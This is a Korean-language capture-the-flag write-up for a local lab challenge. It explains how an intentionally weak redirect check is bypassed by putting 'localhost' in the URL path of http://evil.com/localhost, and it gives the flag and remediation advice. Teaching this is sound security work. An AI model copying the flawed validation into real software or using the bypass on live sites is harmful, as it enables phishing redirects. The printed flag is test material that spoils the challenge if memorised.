# [client] Open Redirect 라이트업

- 대상: `arang-edu-challs-collection` / `challenges/client/open-redirect`
- 카테고리: client
- 버그클래스: Open Redirection
- 포트: 9108

## 취약점 분석

`challenges/client/open-redirect/app.py`:

```python
def is_safe(url):
    # 의도적으로 허술한 검사: 'localhost' 포함 또는 '/' 시작이면 안전하다고 판단
    return url.startswith("/") or "localhost" in url

@app.route("/go")
def go():
    nxt = request.args.get("next", "/welcome")
    if not is_safe(nxt):
        return "차단된 리다이렉트", 400
    host = urlparse(nxt if "://" in nxt else "http://x" + nxt).hostname or ""
    if host and host not in ("x", "") and "localhost" not in host and not nxt.startswith("/welcome"):
        return (... flag 출력 ...)
    return redirect(nxt)
```

두 개의 서로 다른 검사가 어긋나 있는 게 핵심이다.

- **`is_safe()`** (리다이렉트 허용 여부): `next` 값 **문자열 전체**에서 `"localhost"`라는 글자가 어디든 포함돼 있으면 통과시킨다 (호스트 부분일 필요 없음, path나 query에 있어도 됨).
- **flag 노출 조건**: `urlparse()`로 파싱한 **hostname**에 `"localhost"`가 없어야 하고, 그 hostname이 실제 존재하는 외부 도메인이어야 한다.

즉 `"localhost"` 문자열을 **hostname이 아닌 다른 위치**(경로 등)에 넣으면, `is_safe()`는 통과하면서 동시에 hostname은 진짜 외부 도메인으로 인식되어 두 조건을 동시에 만족시킬 수 있다.

## 익스플로잇

```
http://localhost:9108/go?next=http://evil.com/localhost
```

`next` 값: `http://evil.com/localhost`

- `is_safe()`: 문자열에 `"localhost"`가 포함(경로 부분) → 통과
- `urlparse("http://evil.com/localhost").hostname` → `"evil.com"` (localhost 없음, 실제 외부 도메인) → flag 노출 조건 충족

### 검증 (로컬 Python 시뮬레이션)

```python
from urllib.parse import urlparse

def is_safe(url):
    return url.startswith("/") or "localhost" in url

def simulate(nxt):
    if not is_safe(nxt):
        return "차단됨 (400)"
    host = urlparse(nxt if "://" in nxt else "http://x" + nxt).hostname or ""
    if host and host not in ("x", "") and "localhost" not in host and not nxt.startswith("/welcome"):
        return f"FLAG 노출! host={host}"
    return f"그냥 redirect (host={host})"

print(simulate("http://evil.com/localhost"))
# -> FLAG 노출! host=evil.com
```

참고로 README에 예시로 제시된 `next=//evil.com`, `next=https://localhost.evil.com/`은 실제로는 **flag가 노출되지 않는다**(각각 hostname이 `x`로 잘못 파싱되거나, hostname 자체에 `"localhost"`가 포함되어 두 번째 조건에서 막힘). 직접 시뮬레이션으로 확인 후 실제 동작하는 페이로드를 찾아 사용했다.

## 진행 절차

1. `docker compose up -d --build open-redirect`
2. 브라우저 주소창에 `http://localhost:9108/go?next=http://evil.com/localhost` 입력
3. 화면에 "open redirect 성공!" 메시지와 flag 출력 확인

## 플래그

```
flag{625a4c1e77f4f522ae90}
```

## 대응방안

- 리다이렉트 대상은 화이트리스트(허용 목록) 기반으로 검증
- 상대 경로(`/`로 시작하고 `//`, `/\` 등으로 시작하지 않는 진짜 내부 경로)만 허용
- 문자열 서브스트링 매칭이 아니라, `urlparse()`로 파싱한 hostname을 기준으로 정확히 비교(정확히 일치 또는 신뢰하는 도메인 목록과 대조)
- 검사 로직과 실제 사용 로직(리다이렉트 여부 판단)이 서로 다른 기준을 쓰지 않도록 일원화
